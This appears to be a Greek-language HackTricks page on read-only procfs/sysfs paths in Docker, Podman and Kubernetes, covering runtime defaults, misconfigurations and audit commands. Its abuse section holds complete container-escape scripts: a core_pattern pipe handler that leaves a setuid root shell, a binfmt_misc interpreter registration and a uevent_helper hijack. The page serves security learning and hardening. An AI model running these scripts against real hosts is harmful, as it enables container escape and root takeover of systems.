# Read-Only System Paths

{{#include ../../../../banners/hacktricks-training.md}}

Τα read-only system paths αποτελούν ξεχωριστή προστασία από τα masked paths. Αντί να αποκρύπτουν πλήρως ένα path, το runtime το εκθέτει, αλλά το προσαρτά ως read-only. Αυτό είναι συνηθισμένο για επιλεγμένες τοποθεσίες procfs και sysfs, όπου η πρόσβαση ανάγνωσης μπορεί να είναι αποδεκτή ή λειτουργικά απαραίτητη, αλλά οι εγγραφές θα ήταν υπερβολικά επικίνδυνες.

Ο σκοπός είναι απλός: πολλές διεπαφές του kernel γίνονται πολύ πιο επικίνδυνες όταν είναι εγγράψιμες. Ένα read-only mount δεν εξαλείφει όλη την αξία για reconnaissance, αλλά εμποδίζει ένα compromised workload να τροποποιήσει τα υποκείμενα αρχεία που επικοινωνούν με τον kernel μέσω αυτού του path.

## Λειτουργία

Τα runtimes συχνά χαρακτηρίζουν τμήματα της προβολής proc/sys ως read-only. Ανάλογα με το runtime και το host, αυτό μπορεί να περιλαμβάνει paths όπως:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Η πραγματική λίστα διαφέρει, αλλά το μοντέλο είναι το ίδιο: επιτρέπεται η ορατότητα όπου χρειάζεται και αποκλείεται η τροποποίηση από προεπιλογή.<sup>[[1]](#references)</sup>

## Lab

Επιθεωρήστε τη λίστα read-only paths που δηλώνεται από το Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Επιθεωρήστε την προσαρτημένη προβολή proc/sys μέσα στο container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Επίδραση στην ασφάλεια

Οι read-only διαδρομές του συστήματος περιορίζουν μια μεγάλη κατηγορία καταχρήσεων που επηρεάζουν το host. Ακόμη και όταν ένας attacker μπορεί να επιθεωρήσει τα procfs ή sysfs, η αδυναμία εγγραφής εκεί καταργεί πολλές άμεσες διαδρομές τροποποίησης που αφορούν kernel tunables, crash handlers, module-loading helpers ή άλλα control interfaces. Η έκθεση δεν εξαφανίζεται, αλλά η μετάβαση από την αποκάλυψη πληροφοριών στην επιρροή του host γίνεται δυσκολότερη.

## Λανθασμένες ρυθμίσεις

Τα κύρια λάθη είναι η άρση του masking ή η επαναπροσάρτηση ευαίσθητων διαδρομών ως read-write, η απευθείας έκθεση περιεχομένου του host proc/sys μέσω writable bind mounts ή η χρήση privileged modes που ουσιαστικά παρακάμπτουν τα ασφαλέστερα προεπιλεγμένα runtime settings. Στο Kubernetes, τα `procMount: Unmasked` και τα privileged workloads συχνά συνυπάρχουν με ασθενέστερη προστασία του proc.<sup>[[2]](#references)</sup> Ένα ακόμη συνηθισμένο operational λάθος είναι η υπόθεση ότι, επειδή το runtime συνήθως προσαρτά αυτές τις διαδρομές ως read-only, όλα τα workloads εξακολουθούν να κληρονομούν αυτή την προεπιλογή.

## Κατάχρηση

Αν η προστασία είναι ασθενής, ξεκινήστε αναζητώντας writable καταχωρίσεις proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Όταν υπάρχουν εγγραφές με δικαίωμα εγγραφής, οι σημαντικές διαδρομές για επόμενα βήματα περιλαμβάνουν:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Τι μπορούν να αποκαλύψουν αυτές οι εντολές:

- Τα εγγράψιμα entries κάτω από το `/proc/sys` συχνά σημαίνουν ότι το container μπορεί να τροποποιήσει τη συμπεριφορά του kernel του host αντί απλώς να την επιθεωρήσει.
- Το `core_pattern` είναι ιδιαίτερα σημαντικό, επειδή μια εγγράψιμη τιμή που αφορά τον host μπορεί να μετατραπεί σε host code-execution path με crash μιας διεργασίας, αφού πρώτα οριστεί ένας pipe handler.
- Το `modprobe` αποκαλύπτει το helper που χρησιμοποιεί ο kernel για ροές που σχετίζονται με τη φόρτωση modules· αποτελεί κλασικό high-value target όταν είναι εγγράψιμο.
- Το `binfmt_misc` δείχνει αν είναι δυνατή η καταχώριση custom interpreters. Αν η καταχώριση είναι εγγράψιμη, αυτό μπορεί να μετατραπεί σε execution primitive αντί για απλό information leak.
- Το `panic_on_oom` ελέγχει μια kernel απόφαση που αφορά ολόκληρο τον host και επομένως μπορεί να μετατρέψει την εξάντληση πόρων σε host denial of service.
- Το `uevent_helper` είναι ένα από τα σαφέστερα παραδείγματα όπου ένα εγγράψιμο sysfs helper path οδηγεί σε εκτέλεση στο context του host.

Ενδιαφέροντα ευρήματα περιλαμβάνουν εγγράψιμα host-facing proc knobs ή sysfs entries που κανονικά θα έπρεπε να είναι read-only. Σε αυτό το σημείο, το workload έχει μετακινηθεί από μια περιορισμένη οπτική container προς ουσιαστική επιρροή στον kernel.

### Πλήρες Example: `core_pattern` Host Escape

Αν το `/proc/sys/kernel/core_pattern` είναι εγγράψιμο από το εσωτερικό του container και δείχνει στην οπτική του host kernel, μπορεί να γίνει abuse για την εκτέλεση ενός payload μετά από crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Αν η διαδρομή φτάνει πράγματι στον kernel του host, το payload εκτελείται στον host και αφήνει πίσω ένα setuid shell.

### Πλήρες Example: `binfmt_misc` Registration

Αν το `/proc/sys/fs/binfmt_misc/register` είναι writable, μια custom interpreter registration μπορεί να προκαλέσει code execution όταν εκτελείται το matching file:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Σε ένα εγγράψιμο `binfmt_misc` που είναι εκτεθειμένο στο host, το αποτέλεσμα είναι code execution στη διαδρομή του interpreter που ενεργοποιείται από τον kernel.

### Πλήρες Example: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι εγγράψιμο, ο kernel μπορεί να καλέσει ένα helper στη διαδρομή του host όταν ενεργοποιηθεί ένα event που ταιριάζει:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Ο λόγος για τον οποίο αυτό είναι τόσο επικίνδυνο είναι ότι η διαδρομή του helper επιλύεται από την οπτική γωνία του filesystem του host και όχι από ένα ασφαλές context που περιορίζεται μόνο στο container.

## Έλεγχοι

Αυτοί οι έλεγχοι καθορίζουν αν η έκθεση των procfs/sysfs είναι read-only όπου αναμένεται και αν το workload μπορεί ακόμη να τροποποιεί ευαίσθητα kernel interfaces.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Τι είναι ενδιαφέρον εδώ:

- Ένα κανονικό hardened workload θα πρέπει να εκθέτει ελάχιστες writable εγγραφές proc/sys.
- Τα writable paths στο `/proc/sys` είναι συχνά σημαντικότερα από τη συνηθισμένη read access.
- Αν το runtime αναφέρει ότι ένα path είναι read-only, αλλά στην πράξη είναι writable, ελέγξτε προσεκτικά το mount propagation, τα bind mounts και τις ρυθμίσεις privilege.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένη χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή | Το Docker ορίζει μια προεπιλεγμένη λίστα read-only paths για ευαίσθητες εγγραφές proc | έκθεση host proc/sys mounts, `--privileged` |
| Podman | Ενεργοποιημένο από προεπιλογή | Το Podman εφαρμόζει προεπιλεγμένα read-only paths, εκτός αν χαλαρώσουν ρητά | `--security-opt unmask=ALL`, ευρεία host mounts, `--privileged` |
| Kubernetes | Κληρονομεί τις προεπιλογές του runtime | Χρησιμοποιεί το υποκείμενο μοντέλο read-only paths του runtime, εκτός αν αποδυναμωθεί μέσω ρυθμίσεων Pod ή host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Προεπιλογή runtime | Συνήθως βασίζεται στις προεπιλογές OCI/runtime | ίδιο με τη γραμμή Kubernetes· οι άμεσες αλλαγές στη ρύθμιση του runtime μπορούν να αποδυναμώσουν τη συμπεριφορά |

Το βασικό σημείο είναι ότι τα read-only system paths συνήθως υπάρχουν ως προεπιλογή του runtime, αλλά είναι εύκολο να υπονομευθούν με privileged modes ή host bind mounts.

## Αναφορές

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Αναφορά Kubernetes API: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
